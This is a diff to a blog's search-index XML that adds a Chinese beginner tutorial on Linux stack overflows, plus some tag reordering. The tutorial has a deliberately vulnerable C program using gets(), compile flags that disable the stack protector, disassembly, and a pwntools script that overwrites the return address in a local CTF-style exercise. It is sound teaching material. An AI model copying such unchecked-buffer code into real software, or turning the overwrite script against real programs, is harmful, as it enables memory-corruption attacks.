@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>Linux栈溢出入门</title>
+    <link href="/2020/08/03/Linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8/"/>
+    <url>/2020/08/03/Linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%85%A5%E9%97%A8/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近读了读汇编语言这本书，顺便从汇编的角度回顾一下 Linux 下的栈溢出。</p><a id="more"></a><hr><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>来自 ctfwiki：</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() { puts(&quot;You Hava already controlled it.&quot;); }void vulnerable() {    char s[12];    gets(s);    puts(s);    return;}int main(int argc, char **argv) {    vulnerable();    return 0;}</code></pre><p>然后编译：</p><pre><code class="shell">gcc -no-pie -fno-stack-protector stack.c -o stack</code></pre><h3 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h3><p>直接去看 vulnerable 函数的汇编代码：</p><pre><code class="assembly">.text:000000000040054A                                public vulnerable.text:000000000040054A                vulnerable      proc near               ; CODE XREF: main+14↓p.text:000000000040054A.text:000000000040054A                s               = byte ptr -0Ch.text:000000000040054A.text:000000000040054A                ; __unwind {.text:000000000040054A 55                             push    rbp.text:000000000040054B 48 89 E5                       mov     rbp, rsp.text:000000000040054E 48 83 EC 10                    sub     rsp, 10h.text:0000000000400552 48 8D 45 F4                    lea     rax, [rbp+s].text:0000000000400556 48 89 C7                       mov     rdi, rax.text:0000000000400559 B8 00 00 00 00                 mov     eax, 0.text:000000000040055E E8 DD FE FF FF                 call    _gets.text:0000000000400563 48 8D 45 F4                    lea     rax, [rbp+s].text:0000000000400567 48 89 C7                       mov     rdi, rax        ; s.text:000000000040056A E8 C1 FE FF FF                 call    _puts.text:000000000040056F 90                             nop.text:0000000000400570 C9                             leave.text:0000000000400571 C3                             retn.text:0000000000400571                ; } // starts at 40054A.text:0000000000400571                vulnerable      endp</code></pre><p>main 函数在调用 vulnerable 函数时执行的是 call 这个汇编代码，因为是 64 位程序，所以此时的栈大概是这样的情况：</p><pre><code> 0x00    返回地址/rsp指向的地方</code></pre><p>然后执行了 push rbp，就变成了：</p><pre><code> 0x00    返回地址-0x08    执行main函数时rbp寄存器的数据/rsp指向的地方</code></pre><p>sub rsp, 10h：</p><pre><code> 0x00    返回地址-0x08    执行main函数时rbp寄存器的数据-0x18    rsp指向的地方</code></pre><p>接下来就是准备一个地址给 gets 函数调用，这个地址在 IDA 中显示为 rbp+s，其实就是 rbp + 0xF4（补码），即rbp - 0x0c，此时：</p><pre><code> 0x00    返回地址-0x08    执行main函数时rbp寄存器的数据-0x14    读入字符串s的存放地址-0x18    rsp指向的地方</code></pre><p>栈是从高向低生长的，而读入字符串到内存则是从低向高存放的，而且 gets 函数并不会校验读入字符串的长度，所以只要控制输入字符串的长度，使其刚好覆盖返回地址，就可以控制下一段执行的代码，在这个环境中，所需的偏移即为 0x14。</p><p>顺带说一下还原 rbp 的方式，在函数返回之前，leave 会将 rbp 赋给 rsp，然后从栈中取出 rbp，就相当于：</p><pre><code class="assembly">mov     rsp, rbppop     rbp</code></pre><p>其实就是函数最开始的两行代码的反向：</p><pre><code class="assembly">push    rbpmov     rbp, rsp</code></pre><p>最后写出的脚本：</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;target = process(&quot;./stack&quot;)elf = ELF(&quot;./stack&quot;)gdb.attach(proc.pidof(target)[0])success_addr = 0x0000000000400537payload = &quot;T&quot; * 0xc + &quot;F&quot; * 8 + p64(success_addr)target.sendline(payload)target.recv()target.interactive()target.close()</code></pre><p>控制返回地址来调用 success 函数。</p><hr><p>参考：</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctfwiki</a></p><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">从c语言的角度看栈溢出</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-053</title>
     <link href="/2020/08/03/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-053/"/>
     <url>/2020/08/03/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-053/</url>
@@ -841,11 +860,11 @@
     
     <tags>
       
+      <tag>Crypto</tag>
+      
       <tag>Web</tag>
       
       <tag>Pwn</tag>
-      
-      <tag>Crypto</tag>
       
     </tags>
     
@@ -969,11 +988,11 @@
     
     <tags>
       
+      <tag>Crypto</tag>
+      
       <tag>Web</tag>
       
       <tag>Pwn</tag>
-      
-      <tag>Crypto</tag>
       
     </tags>
     
@@ -1303,9 +1322,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1343,9 +1362,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
